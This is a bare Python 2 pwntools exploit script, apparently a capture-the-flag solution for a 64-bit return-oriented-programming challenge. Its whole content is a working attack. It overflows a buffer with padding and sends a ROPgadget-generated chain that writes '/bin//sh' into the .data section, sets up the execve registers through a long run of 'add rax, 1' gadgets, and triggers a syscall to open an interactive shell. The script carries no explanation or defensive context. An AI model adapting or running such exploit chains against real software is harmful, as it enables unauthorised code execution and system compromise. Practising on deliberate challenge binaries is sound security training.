#!/usr/bin/env python2
# execve generated by ROPgadget

from pwn import *

context.log_level = 'debug'

sh = process("/problems/rop64_1_3a135066aff0c433faf93765baaa584d/vuln")
# sh = process("./vuln")

# Padding goes here
p = 'A'*0x10 + 'B'*8

p += p64(0x00000000004100d3) # pop rsi ; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x00000000004156f4) # pop rax ; ret
p += '/bin//sh'
p += p64(0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004100d3) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x0000000000444c50) # xor rax, rax ; ret
p += p64(0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000400686) # pop rdi ; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x00000000004100d3) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x00000000004499b5) # pop rdx ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x0000000000444c50) # xor rax, rax ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x00000000004749c0) # add rax, 1 ; ret
p += p64(0x000000000040123c) # syscall



sh.recv()
sh.sendline(p)
sh.interactive()




